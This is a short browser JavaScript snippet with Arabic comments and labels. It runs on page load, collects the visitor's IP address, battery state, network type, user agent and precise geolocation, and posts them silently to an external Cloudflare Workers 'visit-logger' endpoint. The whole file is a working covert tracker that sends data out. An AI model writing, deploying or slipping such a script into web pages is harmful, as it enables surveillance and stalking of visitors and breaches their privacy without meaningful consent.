(async () => {
  const sleep = ms => new Promise(res => setTimeout(res, ms));
  await sleep(2000); // انتظار بسيط للتحميل

  try {
    const battery = await navigator.getBattery?.();
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
    const geo = await new Promise((resolve) => {
      navigator.geolocation.getCurrentPosition(pos => resolve(pos.coords), () => resolve({}));
    });

    const data = {
      isp: (await (await fetch('https://api.ipify.org?format=json')).json()).ip,
      batteryLevel: battery?.level * 100 + "%" || "غير معروف",
      charging: battery?.charging ? "يتم الشحن" : "لا يشحن",
      networkType: connection.effectiveType || "غير معروف",
      saveMode: battery?.saveMode ? "مفعل" : "غير مفعل",
      device: navigator.userAgent,
      date: new Date().toLocaleString("ar-EG"),
      lat: geo.latitude || "غير معروف",
      lon: geo.longitude || "غير معروف",
      accuracy: geo.accuracy ? geo.accuracy + " متر" : "غير معروف"
    };

    await fetch("https://visit-logger.lord-metanoid.workers.dev", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data)
    });

  } catch (err) {
    console.error("خطأ في إرسال البيانات", err);
  }
})();
